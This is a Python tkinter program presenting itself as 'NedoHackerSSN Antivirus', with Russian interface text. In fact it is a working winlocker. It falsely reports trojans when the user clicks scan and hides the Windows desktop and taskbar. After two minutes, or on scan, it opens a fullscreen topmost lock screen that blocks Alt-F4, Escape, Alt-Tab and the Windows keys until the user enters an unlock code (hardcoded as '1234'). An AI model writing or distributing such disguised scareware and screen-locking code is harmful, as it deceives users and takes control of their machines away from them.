import tkinter as tk
from tkinter import messagebox
from datetime import datetime
import win32gui
import win32con

class FakeAntivirus(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("NedoHackerSSN Antivirus")
        self.geometry("600x400")
        self.configure(bg="#e0f2f1")

        self.last_scan_time = "Никогда"
        self.create_ui()

        # Винлокер запускается через 2 минуты после старта
        self.after(2 * 60 * 1000, self.activate_winlocker)

    def create_ui(self):
        title = tk.Label(self, text="Nedohack Antivirus", font=("Arial", 18, "bold"), bg="#e0f2f1", fg="#00695c")
        title.pack(pady=10)

        self.status = tk.Label(self, text="Состояние: система в норме", font=("Arial", 12), bg="#e0f2f1")
        self.status.pack(pady=5)

        scan_btn = tk.Button(self, text="Проверить систему", command=self.scan_system, font=("Arial", 14), bg="#00796b", fg="white")
        scan_btn.pack(pady=10)

        self.time_label = tk.Label(self, text=f"Последняя проверка: {self.last_scan_time}", font=("Arial", 10), bg="#e0f2f1")
        self.time_label.pack(pady=5)

        self.warning_label = tk.Label(self, text="! ВНИМАНИЕ !", font=("Arial", 16, "bold"), fg="red", bg="#e0f2f1")
        self.warning_label.pack(pady=10)
        self.blink_warning()

    def blink_warning(self):
        current_color = self.warning_label.cget("fg")
        next_color = "red" if current_color == "white" else "white"
        self.warning_label.config(fg=next_color)
        self.after(500, self.blink_warning)

    def scan_system(self):
        self.last_scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.status.config(text="Найдены вирусы: Trojan.Generic64, BackdoorMalwer34", fg="red")
        self.time_label.config(text=f"Последняя проверка: {self.last_scan_time}")
        self.hide_explorer()
        self.activate_winlocker()

    def hide_explorer(self):
        progman = win32gui.FindWindow("Progman", None)
        taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
        if progman:
            win32gui.ShowWindow(progman, win32con.SW_HIDE)
        if taskbar:
            win32gui.ShowWindow(taskbar, win32con.SW_HIDE)

    def activate_winlocker(self):
        locker = tk.Toplevel()
        locker.title("Система заблокирована")
        locker.attributes("-fullscreen", True)
        locker.attributes("-topmost", True)
        locker.configure(bg="black")
        locker.focus_force()
        locker.grab_set()

        # Блокируем попытки закрытия окна
        def block_keys(event): return "break"
        for seq in ["<Alt-F4>", "<Control-Escape>", "<Escape>",
                    "<F11>", "<Alt-Tab>", "<Command-Tab>", "<Super_L>", "<Super_R>"]:
            locker.bind_all(seq, block_keys)
        locker.protocol("System32 no found", lambda: None)

        msg = tk.Label(locker, text="Система заблокирована!\nВведите код разблокировки:", font=("Arial", 24), fg="red", bg="black")
        msg.pack(pady=50)

        code_entry = tk.Entry(locker, font=("Arial", 18), justify="center")
        code_entry.pack(pady=10)

        def check_code():
            if code_entry.get() == "1234":
                messagebox.showinfo("Разблокировка", "Система разблокирована.")
                locker.destroy()
                self.restore_explorer()
            else:
                messagebox.showerror("Ошибка", "Неверный код!")

        submit = tk.Button(locker, text="Разблокировать", command=check_code, font=("Arial", 14), bg="red", fg="white")
        submit.pack(pady=20)

    def restore_explorer(self):
        progman = win32gui.FindWindow("Progman", None)
        taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
        if progman:
            win32gui.ShowWindow(progman, win32con.SW_SHOW)
        if taskbar:
            win32gui.ShowWindow(taskbar, win32con.SW_SHOW)

if __name__ == "__main__":
    app = FakeAntivirus()
    app.mainloop()
